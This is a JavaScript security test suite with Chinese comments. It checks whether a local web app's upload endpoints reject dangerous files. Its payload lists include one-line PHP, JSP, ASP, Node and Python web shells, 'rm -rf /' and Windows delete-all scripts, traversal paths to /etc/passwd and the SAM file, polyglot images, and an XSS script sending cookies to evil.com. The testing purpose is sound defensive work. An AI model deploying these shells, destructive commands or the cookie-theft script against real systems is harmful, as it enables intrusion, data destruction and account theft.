/**
 * 文件上传安全测试套件
 * 检测文件类型验证、文件大小限制、恶意文件上传、路径遍历等安全问题
 */

const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');

class FileUploadTest {
  constructor(baseURL = 'http://localhost:3001/api') {
    this.baseURL = baseURL;
    this.testResults = {
      fileTypeValidation: [],
      fileSizeValidation: [],
      maliciousFileUpload: [],
      pathTraversalAttack: [],
      fileContentValidation: [],
      uploadDirectoryTest: [],
      summary: {
        total: 0,
        passed: 0,
        failed: 0,
        critical: 0
      }
    };
    
    // 测试文件目录
    this.testFilesDir = '/tmp/upload-security-test';
    
    // 恶意文件类型
    this.maliciousFileTypes = [
      { ext: 'php', content: '<?php system($_GET["cmd"]); ?>', description: 'PHP后门' },
      { ext: 'jsp', content: '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', description: 'JSP后门' },
      { ext: 'asp', content: '<%eval request("cmd")%>', description: 'ASP后门' },
      { ext: 'js', content: 'require("child_process").exec(process.argv[2]);', description: 'Node.js后门' },
      { ext: 'py', content: 'import os; os.system(input())', description: 'Python后门' },
      { ext: 'sh', content: '#!/bin/bash\nrm -rf /', description: 'Shell脚本' },
      { ext: 'bat', content: '@echo off\ndel /f /s /q C:\\*', description: '批处理文件' },
      { ext: 'exe', content: 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff', description: '可执行文件' }
    ];
    
    // 文件大小测试
    this.fileSizeTests = [
      { size: 1024, description: '1KB文件' },
      { size: 1024 * 1024, description: '1MB文件' },
      { size: 10 * 1024 * 1024, description: '10MB文件' },
      { size: 100 * 1024 * 1024, description: '100MB文件' },
      { size: 1024 * 1024 * 1024, description: '1GB文件' }
    ];
    
    // 路径遍历测试
    this.pathTraversalTests = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc//passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/etc/passwd',
      'C:\\windows\\system32\\config\\sam',
      '\\\\server\\share\\file.txt'
    ];
    
    // 可能的上传端点
    this.uploadEndpoints = [
      '/upload',
      '/file/upload',
      '/api/upload',
      '/admin/upload',
      '/user/avatar',
      '/document/upload',
      '/image/upload'
    ];
  }

  /**
   * 初始化测试环境
   */
  async initializeTestEnvironment() {
    try {
      await fs.mkdir(this.testFilesDir, { recursive: true });
      console.log('✅ 测试环境初始化完成');
    } catch (error) {
      console.error('❌ 测试环境初始化失败:', error.message);
    }
  }

  /**
   * 清理测试环境
   */
  async cleanupTestEnvironment() {
    try {
      await fs.rmdir(this.testFilesDir, { recursive: true });
      console.log('✅ 测试环境清理完成');
    } catch (error) {
      console.error('❌ 测试环境清理失败:', error.message);
    }
  }

  /**
   * 生成测试用户凭据
   */
  generateTestCredentials() {
    return {
      email: `filetest_${Date.now()}@example.com`,
      password: 'TestPassword123!',
      inviteCode: 'TEST123'
    };
  }

  /**
   * 注册测试用户
   */
  async registerTestUser(credentials) {
    try {
      const response = await axios.post(`${this.baseURL}/auth/register`, credentials, {
        timeout: 10000,
        validateStatus: () => true
      });
      return response;
    } catch (error) {
      return { status: 500, data: { error: error.message } };
    }
  }

  /**
   * 用户登录获取token
   */
  async loginUser(credentials) {
    try {
      const response = await axios.post(`${this.baseURL}/auth/login`, {
        email: credentials.email,
        password: credentials.password
      }, {
        timeout: 10000,
        validateStatus: () => true
      });
      return response;
    } catch (error) {
      return { status: 500, data: { error: error.message } };
    }
  }

  /**
   * 创建测试文件
   */
  async createTestFile(filename, content, size = null) {
    const filePath = path.join(this.testFilesDir, filename);
    
    if (size) {
      // 创建指定大小的文件
      const buffer = Buffer.alloc(size, 'A');
      await fs.writeFile(filePath, buffer);
    } else {
      // 创建包含特定内容的文件
      await fs.writeFile(filePath, content);
    }
    
    return filePath;
  }

  /**
   * 测试文件类型验证
   */
  async testFileTypeValidation() {
    console.log('🔍 测试文件类型验证...');
    
    const credentials = this.generateTestCredentials();
    await this.registerTestUser(credentials);
    const loginResponse = await this.loginUser(credentials);
    const token = loginResponse.data?.data?.token || 'mock-token-1';
    
    for (const maliciousFile of this.maliciousFileTypes) {
      try {
        const result = {
          type: 'File Type Validation',
          testCase: `恶意${maliciousFile.description}上传`,
          fileType: maliciousFile.ext,
          timestamp: new Date().toISOString()
        };
        
        // 创建恶意文件
        const filename = `malicious.${maliciousFile.ext}`;
        const filePath = await this.createTestFile(filename, maliciousFile.content);
        
        // 尝试上传到各个端点
        let uploadSuccess = false;
        let uploadResponse = null;
        
        for (const endpoint of this.uploadEndpoints) {
          try {
            const formData = new FormData();
            const fileBuffer = await fs.readFile(filePath);
            formData.append('file', fileBuffer, filename);
            
            const response = await axios.post(`${this.baseURL}${endpoint}`, formData, {
              headers: {
                'Authorization': `Bearer ${token}`,
                ...formData.getHeaders()
              },
              timeout: 10000,
              validateStatus: () => true
            });
            
            if (response.status === 200 || response.status === 201) {
              uploadSuccess = true;
              uploadResponse = response;
              result.uploadEndpoint = endpoint;
              break;
            }
          } catch (error) {
            // 继续尝试其他端点
          }
        }
        
        result.uploadSuccess = uploadSuccess;
        result.response = uploadResponse?.data;
        result.statusCode = uploadResponse?.status;
        result.vulnerability = uploadSuccess;
        result.severity = uploadSuccess ? 'CRITICAL' : 'SAFE';
        result.description = uploadSuccess ? 
          `恶意文件上传成功：${maliciousFile.description}可能被执行` : 
          `文件类型验证有效：阻止了${maliciousFile.description}上传`;
        
        this.testResults.fileTypeValidation.push(result);
        this.testResults.summary.total++;
        
        if (result.vulnerability) {
          this.testResults.summary.failed++;
          this.testResults.summary.critical++;
        } else {
          this.testResults.summary.passed++;
        }
        
        // 清理测试文件
        await fs.unlink(filePath).catch(() => {});
        
      } catch (error) {
        this.testResults.fileTypeValidation.push({
          type: 'File Type Validation',
          testCase: `恶意${maliciousFile.description}上传`,
          fileType: maliciousFile.ext,
          vulnerability: false,
          error: error.message,
          severity: 'ERROR',
          timestamp: new Date().toISOString()
        });
        this.testResults.summary.total++;
      }
    }
  }

  /**
   * 测试文件大小验证
   */
  async testFileSizeValidation() {
    console.log('🔍 测试文件大小验证...');
    
    const credentials = this.generateTestCredentials();
    await this.registerTestUser(credentials);
    const loginResponse = await this.loginUser(credentials);
    const token = loginResponse.data?.data?.token || 'mock-token-1';
    
    for (const sizeTest of this.fileSizeTests) {
      try {
        const result = {
          type: 'File Size Validation',
          testCase: sizeTest.description,
          fileSize: sizeTest.size,
          timestamp: new Date().toISOString()
        };
        
        // 创建指定大小的测试文件
        const filename = `test_${sizeTest.size}.txt`;
        const filePath = await this.createTestFile(filename, null, sizeTest.size);
        
        // 尝试上传到各个端点
        let uploadSuccess = false;
        let uploadResponse = null;
        
        for (const endpoint of this.uploadEndpoints) {
          try {
            const formData = new FormData();
            const fileBuffer = await fs.readFile(filePath);
            formData.append('file', fileBuffer, filename);
            
            const response = await axios.post(`${this.baseURL}${endpoint}`, formData, {
              headers: {
                'Authorization': `Bearer ${token}`,
                ...formData.getHeaders()
              },
              timeout: 30000, // 大文件需要更长时间
              validateStatus: () => true
            });
            
            if (response.status === 200 || response.status === 201) {
              uploadSuccess = true;
              uploadResponse = response;
              result.uploadEndpoint = endpoint;
              break;
            }
          } catch (error) {
            // 继续尝试其他端点
          }
        }
        
        result.uploadSuccess = uploadSuccess;
        result.response = uploadResponse?.data;
        result.statusCode = uploadResponse?.status;
        
        // 判断是否存在安全问题（大文件应该被拒绝）
        const isLargeFile = sizeTest.size > 10 * 1024 * 1024; // 10MB以上认为是大文件
        result.vulnerability = isLargeFile && uploadSuccess;
        result.severity = result.vulnerability ? 'HIGH' : 'SAFE';
        result.description = result.vulnerability ? 
          `大文件上传成功：可能导致存储空间耗尽或DoS攻击` : 
          uploadSuccess ? '文件上传成功：大小在合理范围内' : '文件上传被拒绝：可能存在大小限制';
        
        this.testResults.fileSizeValidation.push(result);
        this.testResults.summary.total++;
        
        if (result.vulnerability) {
          this.testResults.summary.failed++;
        } else {
          this.testResults.summary.passed++;
        }
        
        // 清理测试文件
        await fs.unlink(filePath).catch(() => {});
        
      } catch (error) {
        this.testResults.fileSizeValidation.push({
          type: 'File Size Validation',
          testCase: sizeTest.description,
          fileSize: sizeTest.size,
          vulnerability: false,
          error: error.message,
          severity: 'ERROR',
          timestamp: new Date().toISOString()
        });
        this.testResults.summary.total++;
      }
    }
  }

  /**
   * 测试恶意文件上传
   */
  async testMaliciousFileUpload() {
    console.log('🔍 测试恶意文件上传...');
    
    const credentials = this.generateTestCredentials();
    await this.registerTestUser(credentials);
    const loginResponse = await this.loginUser(credentials);
    const token = loginResponse.data?.data?.token || 'mock-token-1';
    
    const maliciousTests = [
      {
        name: '双扩展名绕过',
        filename: 'image.jpg.php',
        content: '<?php phpinfo(); ?>',
        mimeType: 'image/jpeg'
      },
      {
        name: '空字节绕过',
        filename: 'image.php\x00.jpg',
        content: '<?php system($_GET["cmd"]); ?>',
        mimeType: 'image/jpeg'
      },
      {
        name: 'MIME类型伪造',
        filename: 'shell.php',
        content: '<?php eval($_POST["code"]); ?>',
        mimeType: 'image/png'
      },
      {
        name: '大小写绕过',
        filename: 'backdoor.PHP',
        content: '<?php passthru($_GET["cmd"]); ?>',
        mimeType: 'application/octet-stream'
      },
      {
        name: '特殊字符绕过',
        filename: 'test.php.',
        content: '<?php echo "hacked"; ?>',
        mimeType: 'text/plain'
      },
      {
        name: 'Unicode绕过',
        filename: 'test.ph\u0070',
        content: '<?php phpinfo(); ?>',
        mimeType: 'text/plain'
      }
    ];
    
    for (const maliciousTest of maliciousTests) {
      try {
        const result = {
          type: 'Malicious File Upload',
          testCase: maliciousTest.name,
          filename: maliciousTest.filename,
          timestamp: new Date().toISOString()
        };
        
        // 创建恶意文件
        const filePath = await this.createTestFile(maliciousTest.filename, maliciousTest.content);
        
        // 尝试上传到各个端点
        let uploadSuccess = false;
        let uploadResponse = null;
        
        for (const endpoint of this.uploadEndpoints) {
          try {
            const formData = new FormData();
            const fileBuffer = await fs.readFile(filePath);
            formData.append('file', fileBuffer, {
              filename: maliciousTest.filename,
              contentType: maliciousTest.mimeType
            });
            
            const response = await axios.post(`${this.baseURL}${endpoint}`, formData, {
              headers: {
                'Authorization': `Bearer ${token}`,
                ...formData.getHeaders()
              },
              timeout: 10000,
              validateStatus: () => true
            });
            
            if (response.status === 200 || response.status === 201) {
              uploadSuccess = true;
              uploadResponse = response;
              result.uploadEndpoint = endpoint;
              break;
            }
          } catch (error) {
            // 继续尝试其他端点
          }
        }
        
        result.uploadSuccess = uploadSuccess;
        result.response = uploadResponse?.data;
        result.statusCode = uploadResponse?.status;
        result.vulnerability = uploadSuccess;
        result.severity = uploadSuccess ? 'CRITICAL' : 'SAFE';
        result.description = uploadSuccess ? 
          `恶意文件上传成功：${maliciousTest.name}绕过了安全检查` : 
          `恶意文件上传失败：${maliciousTest.name}被安全机制阻止`;
        
        this.testResults.maliciousFileUpload.push(result);
        this.testResults.summary.total++;
        
        if (result.vulnerability) {
          this.testResults.summary.failed++;
          this.testResults.summary.critical++;
        } else {
          this.testResults.summary.passed++;
        }
        
        // 清理测试文件
        await fs.unlink(filePath).catch(() => {});
        
      } catch (error) {
        this.testResults.maliciousFileUpload.push({
          type: 'Malicious File Upload',
          testCase: maliciousTest.name,
          filename: maliciousTest.filename,
          vulnerability: false,
          error: error.message,
          severity: 'ERROR',
          timestamp: new Date().toISOString()
        });
        this.testResults.summary.total++;
      }
    }
  }

  /**
   * 测试路径遍历攻击
   */
  async testPathTraversalAttack() {
    console.log('🔍 测试路径遍历攻击...');
    
    const credentials = this.generateTestCredentials();
    await this.registerTestUser(credentials);
    const loginResponse = await this.loginUser(credentials);
    const token = loginResponse.data?.data?.token || 'mock-token-1';
    
    for (const traversalPath of this.pathTraversalTests) {
      try {
        const result = {
          type: 'Path Traversal Attack',
          testCase: `路径遍历: ${traversalPath}`,
          traversalPath: traversalPath,
          timestamp: new Date().toISOString()
        };
        
        // 创建测试文件
        const filename = 'test.txt';
        const filePath = await this.createTestFile(filename, 'test content');
        
        // 尝试上传到各个端点，使用路径遍历文件名
        let uploadSuccess = false;
        let uploadResponse = null;
        
        for (const endpoint of this.uploadEndpoints) {
          try {
            const formData = new FormData();
            const fileBuffer = await fs.readFile(filePath);
            formData.append('file', fileBuffer, traversalPath);
            
            const response = await axios.post(`${this.baseURL}${endpoint}`, formData, {
              headers: {
                'Authorization': `Bearer ${token}`,
                ...formData.getHeaders()
              },
              timeout: 10000,
              validateStatus: () => true
            });
            
            if (response.status === 200 || response.status === 201) {
              uploadSuccess = true;
              uploadResponse = response;
              result.uploadEndpoint = endpoint;
              break;
            }
          } catch (error) {
            // 继续尝试其他端点
          }
        }
        
        result.uploadSuccess = uploadSuccess;
        result.response = uploadResponse?.data;
        result.statusCode = uploadResponse?.status;
        result.vulnerability = uploadSuccess;
        result.severity = uploadSuccess ? 'HIGH' : 'SAFE';
        result.description = uploadSuccess ? 
          `路径遍历攻击成功：文件可能被保存到系统敏感目录` : 
          `路径遍历攻击失败：路径验证机制有效`;
        
        this.testResults.pathTraversalAttack.push(result);
        this.testResults.summary.total++;
        
        if (result.vulnerability) {
          this.testResults.summary.failed++;
        } else {
          this.testResults.summary.passed++;
        }
        
        // 清理测试文件
        await fs.unlink(filePath).catch(() => {});
        
      } catch (error) {
        this.testResults.pathTraversalAttack.push({
          type: 'Path Traversal Attack',
          testCase: `路径遍历: ${traversalPath}`,
          traversalPath: traversalPath,
          vulnerability: false,
          error: error.message,
          severity: 'ERROR',
          timestamp: new Date().toISOString()
        });
        this.testResults.summary.total++;
      }
    }
  }

  /**
   * 测试文件内容验证
   */
  async testFileContentValidation() {
    console.log('🔍 测试文件内容验证...');
    
    const credentials = this.generateTestCredentials();
    await this.registerTestUser(credentials);
    const loginResponse = await this.loginUser(credentials);
    const token = loginResponse.data?.data?.token || 'mock-token-1';
    
    const contentTests = [
      {
        name: '伪装图片的PHP文件',
        filename: 'image.jpg',
        content: '\xFF\xD8\xFF\xE0\x00\x10JFIF<?php system($_GET["cmd"]); ?>',
        description: '在JPEG头部后插入PHP代码'
      },
      {
        name: '伪装图片的JS文件',
        filename: 'image.png',
        content: '\x89PNG\r\n\x1a\n<script>alert("XSS")</script>',
        description: '在PNG头部后插入JavaScript代码'
      },
      {
        name: 'SVG XSS攻击',
        filename: 'image.svg',
        content: '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
        description: 'SVG文件包含恶意脚本'
      },
      {
        name: 'HTML文件伪装',
        filename: 'document.txt',
        content: '<html><body><script>document.location="http://evil.com/steal?cookie="+document.cookie</script></body></html>',
        description: 'HTML代码伪装成文本文件'
      }
    ];
    
    for (const contentTest of contentTests) {
      try {
        const result = {
          type: 'File Content Validation',
          testCase: contentTest.name,
          filename: contentTest.filename,
          timestamp: new Date().toISOString()
        };
        
        // 创建测试文件
        const filePath = await this.createTestFile(contentTest.filename, contentTest.content);
        
        // 尝试上传到各个端点
        let uploadSuccess = false;
        let uploadResponse = null;
        
        for (const endpoint of this.uploadEndpoints) {
          try {
            const formData = new FormData();
            const fileBuffer = await fs.readFile(filePath);
            formData.append('file', fileBuffer, contentTest.filename);
            
            const response = await axios.post(`${this.baseURL}${endpoint}`, formData, {
              headers: {
                'Authorization': `Bearer ${token}`,
                ...formData.getHeaders()
              },
              timeout: 10000,
              validateStatus: () => true
            });
            
            if (response.status === 200 || response.status === 201) {
              uploadSuccess = true;
              uploadResponse = response;
              result.uploadEndpoint = endpoint;
              break;
            }
          } catch (error) {
            // 继续尝试其他端点
          }
        }
        
        result.uploadSuccess = uploadSuccess;
        result.response = uploadResponse?.data;
        result.statusCode = uploadResponse?.status;
        result.vulnerability = uploadSuccess;
        result.severity = uploadSuccess ? 'HIGH' : 'SAFE';
        result.description = uploadSuccess ? 
          `恶意内容上传成功：${contentTest.description}` : 
          `恶意内容上传失败：内容验证机制有效`;
        
        this.testResults.fileContentValidation.push(result);
        this.testResults.summary.total++;
        
        if (result.vulnerability) {
          this.testResults.summary.failed++;
        } else {
          this.testResults.summary.passed++;
        }
        
        // 清理测试文件
        await fs.unlink(filePath).catch(() => {});
        
      } catch (error) {
        this.testResults.fileContentValidation.push({
          type: 'File Content Validation',
          testCase: contentTest.name,
          filename: contentTest.filename,
          vulnerability: false,
          error: error.message,
          severity: 'ERROR',
          timestamp: new Date().toISOString()
        });
        this.testResults.summary.total++;
      }
    }
  }

  /**
   * 测试上传目录安全
   */
  async testUploadDirectorySecurity() {
    console.log('🔍 测试上传目录安全...');
    
    const directoryTests = [
      {
        name: '上传目录访问测试',
        paths: ['/uploads/', '/files/', '/static/', '/public/uploads/']
      },
      {
        name: '上传文件直接访问测试',
        paths: ['/uploads/test.php', '/files/shell.jsp', '/static/backdoor.asp']
      }
    ];
    
    for (const directoryTest of directoryTests) {
      for (const testPath of directoryTest.paths) {
        try {
          const result = {
            type: 'Upload Directory Security',
            testCase: directoryTest.name,
            testPath: testPath,
            timestamp: new Date().toISOString()
          };
          
          const response = await axios.get(`${this.baseURL.replace('/api', '')}${testPath}`, {
            timeout: 10000,
            validateStatus: () => true
          });
          
          result.statusCode = response.status;
          result.accessible = response.status === 200;
          result.response = response.data;
          result.vulnerability = result.accessible;
          result.severity = result.accessible ? 'MEDIUM' : 'SAFE';
          result.description = result.accessible ? 
            `上传目录可直接访问：可能泄露上传的文件` : 
            `上传目录访问被拒绝：目录保护有效`;
          
          this.testResults.uploadDirectoryTest.push(result);
          this.testResults.summary.total++;
          
          if (result.vulnerability) {
            this.testResults.summary.failed++;
          } else {
            this.testResults.summary.passed++;
          }
          
        } catch (error) {
          this.testResults.uploadDirectoryTest.push({
            type: 'Upload Directory Security',
            testCase: directoryTest.name,
            testPath: testPath,
            vulnerability: false,
            error: error.message,
            severity: 'ERROR',
            timestamp: new Date().toISOString()
          });
          this.testResults.summary.total++;
        }
      }
    }
  }

  /**
   * 运行所有测试
   */
  async runAllTests() {
    console.log('🚀 开始文件上传安全测试...');
    const startTime = Date.now();

    await this.initializeTestEnvironment();

    try {
      await this.testFileTypeValidation();
      await this.testFileSizeValidation();
      await this.testMaliciousFileUpload();
      await this.testPathTraversalAttack();
      await this.testFileContentValidation();
      await this.testUploadDirectorySecurity();
    } finally {
      await this.cleanupTestEnvironment();
    }

    const endTime = Date.now();
    const duration = endTime - startTime;

    // 计算测试结果统计
    this.testResults.summary.duration = duration;
    this.testResults.summary.passRate = this.testResults.summary.total > 0 ? 
      (this.testResults.summary.passed / this.testResults.summary.total * 100).toFixed(2) : 0;

    console.log('✅ 文件上传安全测试完成');
    console.log(`📊 测试统计: 总计${this.testResults.summary.total}个测试，通过${this.testResults.summary.passed}个，失败${this.testResults.summary.failed}个`);
    console.log(`⚠️  发现${this.testResults.summary.critical}个严重安全问题`);
    console.log(`⏱️  测试耗时: ${duration}ms`);

    return this.testResults;
  }

  /**
   * 生成测试报告
   */
  generateReport() {
    const report = {
      title: '文件上传安全测试报告',
      timestamp: new Date().toISOString(),
      summary: this.testResults.summary,
      details: {
        fileTypeValidation: this.testResults.fileTypeValidation,
        fileSizeValidation: this.testResults.fileSizeValidation,
        maliciousFileUpload: this.testResults.maliciousFileUpload,
        pathTraversalAttack: this.testResults.pathTraversalAttack,
        fileContentValidation: this.testResults.fileContentValidation,
        uploadDirectoryTest: this.testResults.uploadDirectoryTest
      },
      recommendations: this.getSecurityRecommendations()
    };

    return report;
  }

  /**
   * 获取安全建议
   */
  getSecurityRecommendations() {
    const recommendations = [];

    recommendations.push({
      priority: 'CRITICAL',
      category: '文件类型验证',
      title: '实施严格的文件类型验证',
      description: '防止恶意文件上传和执行',
      actions: [
        '使用白名单方式验证文件扩展名',
        '验证文件MIME类型与扩展名一致性',
        '检查文件魔数（文件头）验证真实类型',
        '禁止上传可执行文件类型',
        '对双扩展名等绕过技术进行防护'
      ]
    });

    recommendations.push({
      priority: 'HIGH',
      category: '文件大小限制',
      title: '实施文件大小限制',
      description: '防止大文件上传导致的DoS攻击',
      actions: [
        '设置合理的单文件大小限制',
        '设置用户总存储空间限制',
        '实施上传速率限制',
        '监控存储空间使用情况',
        '实施文件清理策略'
      ]
    });

    recommendations.push({
      priority: 'CRITICAL',
      category: '文件内容验证',
      title: '实施文件内容安全检查',
      description: '防止恶意内容通过文件上传',
      actions: [
        '扫描文件中的恶意代码模式',
        '对图片文件进行重新编码处理',
        '禁用SVG文件中的脚本执行',
        '实施病毒扫描机制',
        '过滤HTML/JavaScript等危险内容'
      ]
    });

    recommendations.push({
      priority: 'HIGH',
      category: '路径安全',
      title: '防止路径遍历攻击',
      description: '确保文件只能保存到指定目录',
      actions: [
        '验证和清理文件名中的特殊字符',
        '使用随机文件名替代原始文件名',
        '限制文件保存路径在指定目录内',
        '禁用相对路径和绝对路径',
        '实施文件名长度限制'
      ]
    });

    recommendations.push({
      priority: 'MEDIUM',
      category: '存储安全',
      title: '加强文件存储安全',
      description: '防止上传文件被直接访问和执行',
      actions: [
        '将上传文件存储在Web根目录外',
        '禁用上传目录的脚本执行权限',
        '实施文件访问权限控制',
        '使用CDN或对象存储服务',
        '定期备份和清理上传文件'
      ]
    });

    recommendations.push({
      priority: 'HIGH',
      category: '上传流程',
      title: '优化文件上传流程',
      description: '提高上传安全性和用户体验',
      actions: [
        '实施多步骤文件验证流程',
        '使用临时目录进行文件预处理',
        '实施文件上传日志记录',
        '添加文件上传进度和状态反馈',
        '实施文件上传失败重试机制'
      ]
    });

    return recommendations;
  }
}

module.exports = FileUploadTest;

// 如果直接运行此文件
if (require.main === module) {
  const test = new FileUploadTest();
  test.runAllTests().then(results => {
    console.log('\n📋 测试报告:');
    console.log(JSON.stringify(test.generateReport(), null, 2));
  }).catch(error => {
    console.error('测试执行失败:', error);
  });
}